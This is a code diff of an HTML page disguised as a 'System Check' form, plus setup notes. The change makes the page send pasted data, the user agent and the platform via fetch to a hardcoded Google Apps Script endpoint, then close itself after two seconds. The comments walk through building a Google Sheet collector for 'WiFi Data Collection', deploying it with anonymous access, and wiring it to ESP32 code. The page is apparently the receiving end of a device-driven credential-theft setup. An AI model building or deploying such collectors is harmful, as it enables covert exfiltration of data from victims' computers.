@@ -61,15 +61,14 @@
       margin-top: 15px;
       display: none;
     }
-    .admin-link {
+    .loading {
+      background: #2196F3;
+      color: white;
+      padding: 15px;
+      border-radius: 5px;
       text-align: center;
-      margin-top: 20px;
-      color: #666;
-      font-size: 12px;
-    }
-    .admin-link a {
-      color: #333;
-      text-decoration: none;
+      margin-top: 15px;
+      display: none;
     }
   </style>
 </head>
@@ -78,148 +77,56 @@
     <h2>System Check</h2>
     <textarea id="dataInput" placeholder="Paste data here..." autofocus></textarea>
     <button onclick="submitData()">Submit</button>
-    <div class="success" id="successMsg">Data received successfully!</div>
-    <div class="admin-link">
-      <a href="#" onclick="showAdmin(); return false;">Admin Access</a>
-    </div>
-  </div>
-
-  <div class="container" id="adminLogin" style="display: none;">
-    <h2>Admin Login</h2>
-    <input type="password" id="adminPass" placeholder="Enter password" style="width: 100%; padding: 15px; border: 2px solid #ddd; border-radius: 5px; font-size: 14px; margin-bottom: 15px;">
-    <button onclick="checkPassword()">Login</button>
-    <button onclick="showMain()" style="background: #666; margin-top: 10px;">Back</button>
-  </div>
-
-  <div class="container" id="adminPanel" style="display: none;">
-    <h2>Admin Panel - Collected Data</h2>
-    <div style="max-height: 400px; overflow-y: auto; margin-bottom: 20px;">
-      <div id="dataList" style="font-family: 'Courier New', monospace; font-size: 12px; background: #f5f5f5; padding: 15px; border-radius: 5px;">
-        No data collected yet.
-      </div>
-    </div>
-    <button onclick="clearData()" style="background: #f44336;">Clear All Data</button>
-    <button onclick="exportData()" style="background: #2196F3; margin-top: 10px;">Export to File</button>
-    <button onclick="logout()" style="background: #666; margin-top: 10px;">Logout</button>
+    <div class="loading" id="loadingMsg">Sending data...</div>
+    <div class="success" id="successMsg">Data sent successfully!</div>
   </div>
 
   <script>
-    // CHANGE THIS PASSWORD!
-    const ADMIN_PASSWORD = "admin123";
-    
-    // Storage for collected data (using localStorage)
-    let collectedData = JSON.parse(localStorage.getItem('collectedData') || '[]');
+    // IMPORTANT: Replace this with your Google Apps Script Web App URL
+    // See setup instructions below
+    const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxpjaXOOpb2HszSlW8NWQAirXIQx7tsM8N9qqNbSmhmIDXPZeD7HrtEg9eQbZumxgVH/exec";
 
-    function submitData() {
+    async function submitData() {
       const data = document.getElementById('dataInput').value;
       if(!data.trim()) {
         alert('Please paste data first');
         return;
       }
 
-      // Save data with timestamp
-      const entry = {
-        timestamp: new Date().toISOString(),
-        data: data,
-        ip: 'Unknown' // In real deployment, server would capture this
-      };
+      // Show loading
+      document.getElementById('loadingMsg').style.display = 'block';
 
-      collectedData.push(entry);
-      localStorage.setItem('collectedData', JSON.stringify(collectedData));
+      try {
+        // Send to Google Sheets
+        const response = await fetch(GOOGLE_SCRIPT_URL, {
+          method: 'POST',
+          mode: 'no-cors',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            timestamp: new Date().toISOString(),
+            data: data,
+            userAgent: navigator.userAgent,
+            platform: navigator.platform
+          })
+        });
 
-      // Show success message
-      document.getElementById('successMsg').style.display = 'block';
-      document.getElementById('dataInput').value = '';
+        // Hide loading, show success
+        document.getElementById('loadingMsg').style.display = 'none';
+        document.getElementById('successMsg').style.display = 'block';
+        document.getElementById('dataInput').value = '';
 
-      // Auto-close after 2 seconds (mimics the ESP32 script)
-      setTimeout(() => {
-        window.close();
-      }, 2000);
-    }
+        // Auto-close after 2 seconds
+        setTimeout(() => {
+          window.close();
+        }, 2000);
 
-    function showAdmin() {
-      document.getElementById('mainPage').style.display = 'none';
-      document.getElementById('adminLogin').style.display = 'block';
-      document.getElementById('adminPass').focus();
-    }
-
-    function showMain() {
-      document.getElementById('adminLogin').style.display = 'none';
-      document.getElementById('mainPage').style.display = 'block';
-    }
-
-    function checkPassword() {
-      const pass = document.getElementById('adminPass').value;
-      if(pass === ADMIN_PASSWORD) {
-        document.getElementById('adminLogin').style.display = 'none';
-        document.getElementById('adminPanel').style.display = 'block';
-        displayData();
-      } else {
-        alert('Incorrect password');
-        document.getElementById('adminPass').value = '';
+      } catch (error) {
+        console.error('Error:', error);
+        alert('Failed to send data');
+        document.getElementById('loadingMsg').style.display = 'none';
       }
-    }
-
-    function displayData() {
-      const list = document.getElementById('dataList');
-      
-      if(collectedData.length === 0) {
-        list.innerHTML = 'No data collected yet.';
-        return;
-      }
-
-      let html = '';
-      collectedData.forEach((entry, index) => {
-        const date = new Date(entry.timestamp);
-        html += `
-          <div style="background: white; padding: 10px; margin-bottom: 10px; border-left: 3px solid #4CAF50; border-radius: 3px;">
-            <strong>Entry #${index + 1}</strong> - ${date.toLocaleString()}<br>
-            <pre style="margin-top: 10px; white-space: pre-wrap; word-wrap: break-word;">${entry.data}</pre>
-          </div>
-        `;
-      });
-
-      list.innerHTML = html;
-    }
-
-    function clearData() {
-      if(confirm('Are you sure you want to delete all collected data?')) {
-        collectedData = [];
-        localStorage.setItem('collectedData', JSON.stringify(collectedData));
-        displayData();
-        alert('All data cleared');
-      }
-    }
-
-    function exportData() {
-      if(collectedData.length === 0) {
-        alert('No data to export');
-        return;
-      }
-
-      let exportText = 'COLLECTED DATA EXPORT\n';
-      exportText += '='.repeat(50) + '\n\n';
-
-      collectedData.forEach((entry, index) => {
-        const date = new Date(entry.timestamp);
-        exportText += `Entry #${index + 1}\n`;
-        exportText += `Timestamp: ${date.toLocaleString()}\n`;
-        exportText += `Data:\n${entry.data}\n`;
-        exportText += '-'.repeat(50) + '\n\n';
-      });
-
-      const blob = new Blob([exportText], { type: 'text/plain' });
-      const url = window.URL.createObjectURL(blob);
-      const a = document.createElement('a');
-      a.href = url;
-      a.download = 'collected_data_' + Date.now() + '.txt';
-      a.click();
-    }
-
-    function logout() {
-      document.getElementById('adminPanel').style.display = 'none';
-      document.getElementById('mainPage').style.display = 'block';
-      document.getElementById('adminPass').value = '';
     }
 
     // Auto-focus on text area when page loads
@@ -227,15 +134,82 @@
       document.getElementById('dataInput').focus();
     }
 
-    // Allow Enter key in password field
-    document.addEventListener('DOMContentLoaded', function() {
-      const passField = document.getElementById('adminPass');
-      if(passField) {
-        passField.addEventListener('keypress', function(e) {
-          if(e.key === 'Enter') checkPassword();
-        });
+    // Allow pressing Enter in textarea to submit
+    document.getElementById('dataInput').addEventListener('keydown', function(e) {
+      if(e.ctrlKey && e.key === 'Enter') {
+        submitData();
       }
     });
   </script>
 </body>
 </html>
+
+<!-- 
+====================================================================
+SETUP INSTRUCTIONS - GOOGLE SHEETS INTEGRATION
+====================================================================
+
+STEP 1: CREATE GOOGLE SHEET
+1. Go to https://sheets.google.com
+2. Create a new spreadsheet
+3. Name it "WiFi Data Collection" or whatever you want
+4. In Row 1, add these headers:
+   A1: Timestamp
+   B1: Data
+   C1: User Agent
+   D1: Platform
+
+STEP 2: CREATE GOOGLE APPS SCRIPT
+1. In your Google Sheet, click Extensions > Apps Script
+2. Delete any code there and paste this:
+
+====================================================================
+function doPost(e) {
+  try {
+    var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
+    var data = JSON.parse(e.postData.contents);
+    
+    sheet.appendRow([
+      data.timestamp,
+      data.data,
+      data.userAgent,
+      data.platform
+    ]);
+    
+    return ContentService.createTextOutput(JSON.stringify({
+      status: 'success'
+    })).setMimeType(ContentService.MimeType.JSON);
+    
+  } catch(error) {
+    return ContentService.createTextOutput(JSON.stringify({
+      status: 'error',
+      message: error.toString()
+    })).setMimeType(ContentService.MimeType.JSON);
+  }
+}
+====================================================================
+
+STEP 3: DEPLOY THE SCRIPT
+1. Click "Deploy" > "New deployment"
+2. Click the gear icon, select "Web app"
+3. Settings:
+   - Description: "Data Collection"
+   - Execute as: "Me"
+   - Who has access: "Anyone"
+4. Click "Deploy"
+5. Copy the Web App URL (looks like: https://script.google.com/macros/s/ABC123.../exec)
+6. Click "Authorize access" and allow permissions
+
+STEP 4: UPDATE THIS HTML FILE
+1. Replace YOUR_GOOGLE_SCRIPT_URL_HERE with your Web App URL
+2. Save and host this HTML file
+
+STEP 5: UPDATE ESP32 CODE
+1. Use the URL where you host this HTML file
+2. Upload and test!
+
+====================================================================
+Now all data will automatically save to your Google Sheet!
+You can access it from anywhere by opening your Google Sheet.
+====================================================================
+-->
